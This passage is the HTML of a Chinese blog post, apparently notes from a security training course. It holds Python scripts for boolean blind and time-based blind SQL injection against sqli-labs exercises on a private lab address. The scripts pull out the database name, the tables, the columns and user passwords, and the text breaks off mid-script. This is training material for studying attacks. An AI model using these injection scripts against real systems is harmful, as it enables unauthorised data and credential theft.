@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"got17.cn","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="第三天补充了几个sql注入知识点，讲了一些命令执行的绕过方法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【网络安全4x03】洞明科技网络安全培训 --- day3">
+<meta property="og:url" content="http://got17.cn/1095/index.html">
+<meta property="og:site_name" content="gaoteng&#39;s blog">
+<meta property="og:description" content="第三天补充了几个sql注入知识点，讲了一些命令执行的绕过方法。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-08-22T15:55:08.000Z">
+<meta property="article:modified_time" content="2022-09-03T03:28:56.706Z">
+<meta property="article:author" content="gaoteng17">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://got17.cn/1095/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://got17.cn/1095/","path":"1095/","title":"【网络安全4x03】洞明科技网络安全培训 --- day3"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【网络安全4x03】洞明科技网络安全培训 --- day3 | gaoteng's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">gaoteng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%85"><span class="nav-number">1.</span> <span class="nav-text">sql注入补充</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">二次注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">命令注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E9%95%BF%E5%BA%A6-lt-8"><span class="nav-number">2.1.</span> <span class="nav-text">限制命令长度&lt;8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">2.1.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-number">2.1.2.</span> <span class="nav-text">方法2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%953"><span class="nav-number">2.1.3.</span> <span class="nav-text">方法3</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gaoteng17"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">gaoteng17</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gaoteng17" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaoteng17" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:gaoteng17@gmail.com" title="E-Mail → mailto:gaoteng17@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5544866728" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5544866728" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://got17.cn/1095/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="gaoteng17">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【网络安全4x03】洞明科技网络安全培训 --- day3 | gaoteng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【网络安全4x03】洞明科技网络安全培训 --- day3
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-08-22 23:55:08" itemprop="dateCreated datePublished" datetime="2020-08-22T23:55:08+08:00">2020-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-03 11:28:56" itemprop="dateModified" datetime="2022-09-03T11:28:56+08:00">2022-09-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>第三天补充了几个sql注入知识点，讲了一些命令执行的绕过方法。</p>
+<span id="more"></span>
+
+<h1 id="sql注入补充"><a href="#sql注入补充" class="headerlink" title="sql注入补充"></a>sql注入补充</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">db = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table =<span class="string">&#x27;&#x27;</span></span><br><span class="line">list1 = []</span><br><span class="line">column = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.0.126:8004/Less-5/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line"><span class="comment">#check_data = list(&#x27;1234567890abcdefghijklmnopqrstuvwxyz@\&#123;\&#125;_&#x27;)</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">	pay1 = <span class="string">&quot;1&#x27;and (length(database()))&gt;%s --+&quot;</span> %i</span><br><span class="line">	re1 = requests.get(url+pay1,headers=headers,timeout=<span class="number">60</span>)</span><br><span class="line">	<span class="keyword">if</span> re1.content.find(code) == -<span class="number">1</span>:</span><br><span class="line">		<span class="built_in">print</span> (i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库名</span></span><br><span class="line"><span class="comment"># for a in range(1,9):</span></span><br><span class="line"><span class="comment"># 	for j in range(1, 128):</span></span><br><span class="line"><span class="comment"># 		pay2 = &quot;1&#x27;and ascii(substr((select database()),%s,1))=%s --+&quot; %(a,j)</span></span><br><span class="line"><span class="comment"># 		re2 = requests.get(url+pay2,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		if re2.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			db = db + chr(j)</span></span><br><span class="line"><span class="comment"># 			print (a,db)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(limit)</span></span><br><span class="line"><span class="comment"># for j in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for n in range(1,10):</span></span><br><span class="line"><span class="comment"># 		for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 			and ascii(substr((select table_name from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 			 where table_schema=database() limit %s,1),%s,1))=%s --+&quot; %(j,n,i)</span></span><br><span class="line"><span class="comment"># 			re3 = requests.get(url+pay3,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 			#print url3</span></span><br><span class="line"><span class="comment"># 			if re3.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 				table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 				print(j,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(group_concat)</span></span><br><span class="line"><span class="comment"># for n in range(1,50):</span></span><br><span class="line"><span class="comment"># 	for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 		and ascii(substr((select group_concat(table_name) from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 		 where table_schema=database()),%s,1))=%s --+&quot; %(n,i)</span></span><br><span class="line"><span class="comment"># 		re3 = requests.get(url+pay3,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		#print url3</span></span><br><span class="line"><span class="comment"># 		if re3.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 			print (n,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(limit)</span></span><br><span class="line"><span class="comment"># for a in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for b in xrange(1,20):</span></span><br><span class="line"><span class="comment"># 		for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 			and ascii(substr((select column_name from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 			where table_name=&#x27;users&#x27; limit %s,1),%s,1))=%s --+&quot; %(a,b,c)</span></span><br><span class="line"><span class="comment"># 			re4 = requests.get(url+pay4,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 			if re4.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 				column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 				print (a,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(group_concat)</span></span><br><span class="line"><span class="comment"># for b in xrange(1,50):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and ascii(substr((select group_concat(column_name) from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 		where table_name=&#x27;users&#x27;),%s,1))=%s --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		re4 = requests.get(url+pay4,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		if re4.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆数据</span></span><br><span class="line"><span class="comment"># for b in xrange(1,100):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay5 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and ascii(substr((select group_concat(username,&#x27; &#x27;,password) from users),%s,1))=%s --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		re5 = requests.get(url+pay5,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		if re5.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			flag = flag+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,flag)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">db = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table =<span class="string">&#x27;&#x27;</span></span><br><span class="line">list1 = []</span><br><span class="line">column = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.0.126:8004/Less-9/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">names = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyz@!@#$%^&amp;*()-=`~[];,._+|:&lt;&gt;?&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">	pay1 = <span class="string">&quot;1&#x27; and if(length(database())&gt;%d,1,sleep(2)) --+&quot;</span> %i</span><br><span class="line">	time1 = datetime.datetime.now()</span><br><span class="line">	re1 = requests.get(url+pay1)</span><br><span class="line">	time2 = datetime.datetime.now()</span><br><span class="line">	sec = (time2 - time1).seconds</span><br><span class="line">	<span class="keyword">if</span> sec &gt;= <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">print</span> (<span class="string">&#x27;length&#x27;</span>,i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库名</span></span><br><span class="line"><span class="comment"># for a in range(1,9):</span></span><br><span class="line"><span class="comment"># 	for j in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay2 = &quot;1&#x27; and if(ascii(substr((select database()),%d,1))=%d,sleep(2),1) --+&quot; %(a,j)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re2 = requests.get(url+pay2)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			db += chr(j)</span></span><br><span class="line"><span class="comment"># 			print(a,db)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(limit)</span></span><br><span class="line"><span class="comment"># for j in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for n in range(1,10):</span></span><br><span class="line"><span class="comment"># 		for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 			and if(ascii(substr((select table_name from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 			 where table_schema=database() limit %d,1),%d,1))=%d,sleep(2),1) --+&quot; %(j,n,i)</span></span><br><span class="line"><span class="comment"># 			time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			re3 = requests.get(url+pay3)</span></span><br><span class="line"><span class="comment"># 			time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 			if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 				table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 				print(j,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(group_concat)</span></span><br><span class="line"><span class="comment"># for n in range(1,50):</span></span><br><span class="line"><span class="comment"># 	for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 		and if(ascii(substr((select group_concat(table_name) from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 		 where table_schema=database()),%d,1))=%d,sleep(2),1) --+&quot; %(n,i)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re3 = requests.get(url+pay3)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 			print(n,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(limit)</span></span><br><span class="line"><span class="comment"># for a in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for b in xrange(1,20):</span></span><br><span class="line"><span class="comment"># 		for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 			and if(ascii(substr((select column_name from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 			where table_name=&#x27;users&#x27; limit %d,1),%d,1))=%d,sleep(2),1) --+&quot; %(a,b,c)</span></span><br><span class="line"><span class="comment"># 			time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			re4 = requests.get(url+pay4)</span></span><br><span class="line"><span class="comment"># 			time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 			if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 				column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 				print (a,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(group_concat)</span></span><br><span class="line"><span class="comment"># for b in xrange(1,50):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and if(ascii(substr((select group_concat(column_name) from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 		where table_name=&#x27;users&#x27;),%d,1))=%d,sleep(2),1) --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re4 = requests.get(url+pay4)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆数据</span></span><br><span class="line"><span class="comment"># for b in xrange(1,300):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay5 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and if(ascii(substr((select group_concat(username,&#x27; &#x27;,password) from users),%d,1))=%d,sleep(2),1) --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		time1 = 